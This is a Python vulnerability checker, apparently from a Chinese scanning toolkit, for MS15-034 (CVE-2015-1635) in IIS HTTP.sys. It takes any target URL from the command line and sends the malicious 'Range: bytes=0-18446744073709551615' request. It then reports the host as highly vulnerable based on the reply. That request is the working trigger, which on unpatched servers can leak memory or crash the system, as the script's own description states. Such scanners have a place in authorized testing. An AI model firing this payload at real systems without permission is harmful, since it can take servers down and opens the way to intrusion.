#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: ms15_034 http.sys远程代码执行(CVE-2015-1635)
referer: http://www.myhack58.com/Article/html/3/62/2015/61431.htm
author: Lucifer
description: 利用HTTP.sys的安全漏洞，攻击者只需要发送恶意的http请求数据包，就可能远程读取IIS服务器的内存数据，或使服务器系统蓝屏崩溃，一定条件下可导致远程代码执行。
'''
import sys
import ssl
import warnings
import socket
from termcolor import cprint
from urllib.parse import urlparse

class iis_ms15034_httpsys_rce_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        port = 80
        if r"http" in self.url:
            #提取host
            host = urlparse(self.url)[1]
            try:
                port = int(host.split(':')[1])
            except:
                pass
            flag = host.find(":")
            if flag != -1:
                host = host[:flag]
        else:
            host = self.url

        try:
            request = "GET / HTTP/1.1\r\nHost: %s\r\nRange: bytes=0-18446744073709551615\r\n\r\n"%host
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(6)
            if r"https" in self.url:
                sock = ssl.wrap_socket(sock)
            sock.connect((host, port))
            sock.send(request.encode())
            response = sock.recv(1024).decode()
            if "Requested Range Not Satisfiable" in response and "Server: nginx" not in response:
                cprint("[+]存在MS15_034 http.sys远程代码执行漏洞...(高危)\tpayload: "+host+":"+str(port), "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = iis_ms15034_httpsys_rce_BaseVerify(sys.argv[1])
    testVuln.run()
